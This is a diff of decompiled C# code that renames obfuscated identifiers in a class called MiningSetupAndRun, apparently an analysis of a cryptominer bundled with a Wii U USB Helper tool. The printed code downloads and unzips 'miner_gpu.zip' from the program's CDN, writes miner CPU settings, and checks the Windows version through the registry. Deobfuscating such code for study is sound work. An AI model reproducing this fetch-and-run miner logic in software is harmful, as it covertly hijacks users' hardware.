@@ -74,24 +74,24 @@ namespace ns0
             for (int index = 0; index < gclass126.ThreadCount; ++index)
               str5 += string.Format("{{ \"low_power_mode\" : 0, \"no_prefetch\" : true, \"affine_to_cpu\" :{0} }},", (object) index);
             string contents3 = str5 + "],";
-            string path = Path.Combine(Miner_Directory, "etag");
-            string Miner_ZIP_Web_Location = GClass6.smethod_14(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.CDNWiiUUSBHelperURL));
-            if (!File.Exists(path) || Miner_ZIP_Web_Location != File.ReadAllText(path))
+            string CurrentMinerMetadata = Path.Combine(Miner_Directory, "etag");
+            string Miner_ZIP_Web_MetaData = GClass6.Get_URL_File_Metadata(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.CDNWiiUUSBHelperURL));
+            if (!File.Exists(CurrentMinerMetadata) || Miner_ZIP_Web_MetaData != File.ReadAllText(CurrentMinerMetadata))
             {
               MiningSetupAndRun.bool_0 = true;
               GClass6.Download_Unzip(string.Format("{0}/mining/miner_gpu.zip", (object) Class67.CDNWiiUUSBHelperURL), Miner_Directory);
-              File.WriteAllText(path, Miner_ZIP_Web_Location);
+              File.WriteAllText(CurrentMinerMetadata, Miner_ZIP_Web_MetaData);
               MiningSetupAndRun.bool_0 = false;
             }
-            bool flag = false;
+            bool IsOSWIndows10 = false;
             try
             {
-              flag = MiningSetupAndRun.smethod_3();
+              IsOSWIndows10 = MiningSetupAndRun.IsOSWindows10();
             }
             catch
             {
             }
-            if (!flag)
+            if (!IsOSWIndows10)
               File.WriteAllText(Path.Combine(Miner_Directory, "config.txt"), File.ReadAllText(Path.Combine(Miner_Directory, "config.txt")).Replace("\"use_slow_memory\" : \"warn\"", "\"use_slow_memory\" : \"always\""));
             File.WriteAllText(Path.Combine(Miner_Directory, "cpu.txt"), contents3);
             try
@@ -171,14 +171,14 @@ label_2:
       }
     }
 
-    private static bool smethod_2(string string_0)
+    private static bool CheckWindowsVersion(string WindowsVersion)
     {
-      return ((string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("ProductName")).Contains(string_0);
+      return ((string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("ProductName")).Contains(WindowsVersion);
     }
 
-    private static bool smethod_3()
+    private static bool IsOSWindows10()
     {
-      return MiningSetupAndRun.smethod_2("Windows 10");
+      return MiningSetupAndRun.CheckWindowsVersion("Windows 10");
     }
   }
 }
